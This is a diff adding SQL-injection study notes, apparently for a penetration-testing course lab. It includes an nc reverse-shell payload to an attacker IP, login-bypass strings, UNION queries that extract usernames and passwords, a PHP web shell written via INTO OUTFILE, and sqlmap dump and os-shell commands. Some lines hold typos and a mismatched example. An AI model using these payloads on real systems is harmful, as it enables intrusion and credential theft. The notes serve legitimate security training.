@@ -140,3 +140,79 @@ data : type of data : comma to mark start of contents.
 `192.168.231.10/menu.php?file=data:text/plain,<?php echo shell_exec("nc 192.168.119.231 80 -e cmd.exe") ?>`  
 
 # SQL Injection
+
+SQL uses a single quote `'` as a string delimeter. If an application cannot handle this character and throws an error, it may indicate an SQL vulnerability injection. Look for informational errors indicating the database software and running application/web servers/operating systems.
+
+### Authentication Bypass
+
+Take this normal login query:  
+`select * from users where name = 'admin' and password = 'pass';`
+
+If vulnerable to SQL injection we can enter `admin' or 1=1;#` as the username:  
+select * from users where name = 'admin' or 1=1;#' and password = 'pass';
+
+Since 1=1 always evaluates to true, we may be able to bypass the password check. Some applicatons may require only one row to be returned in which case we can use the `LIMIT` statement:
+select * from users where name = 'admin' or 1=1 LIMIT 1;#' and password = 'pass';
+
+For some unknown reason the exercises for this section encompassed the training for the following section on using the UNION ALL.
+
+### Enumerating and Extracting Data
+
+Using the order by clause we can enumerate how many columns there are:  
+```sql
+debug.php?id=1 ORDER BY 1
+debug.php?id=1 ORDER BY 2
+debug.php?id=1 ORDER BY 3
+debug.php?id=1 ORDER BY 4
+```
+We will receive an error when we have reached the maximum columns in the query. This is useful if no access to source query. This can be automated using Burp Suite's repeater.
+
+Now that we know how many columns are in a table, we can use a UNION statement to extract more information. This allows us to add a second SELECT statement to the original query using the same number of enumerated columns.  
+`ebug.php?id=1 union all select 1, 2, 3`  
+
+This displays the position of different columns. We can then subtitute in different values to enumerate:
+```sql
+debug.php?id=1 union all select 1, 2, @@version
+debug.php?id=1 union all select 1, 2, user()
+
+# Enumerate information through the schema:
+debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
+
+# Maybe we saw a users table from the above enumeration:
+debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
+
+# Now we can extract information:
+debug.php?id=1 union all select 1, username, password from users
+```
+
+### SQL Code Injuection
+
+Can we use the load_file function?  
+`debug.php?id=1 union all select 1, username, password from users`  
+
+During testing we will likely see the server's web root. We can try dropping a one liner PHP command similar to LFI:
+`debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/www/html/backdoor.php'`  
+
+And access it:
+`191.168.231.10/backdoor.php?cmd=ipconfig`
+
+### Automating SQL Injection
+
+Contuing on we can use sqlmap to automate enumeration:  
+`sqlmap -u http://<IP>/debug.php?id=1 -p "id"`  
+`-u` is the URL while `p` is the parameter to test.  
+
+Once ran we can automate data extraction from the database with the `--dbms` set to the backend type and `--dump` to dump the contents of the database:  
+sqlmap -u http://<ip>/debug.php?id=1 -p "id" --dbms=mysql --dump  
+
+Sqlmap can attempt WAF bypass and complex queries. `--os-shell` will try and get a shell on the system.  
+`sqlmap -u http://<ip>/debug.php?id=1 -p "id" --dbms=mysql --os-shell`
+
+For the exam Ssqlmap is not permitted. For training they recommend using it with Burp and Wireshark to capture what they are doing and replicate manually.
+
+ 
+
+
+
+
+
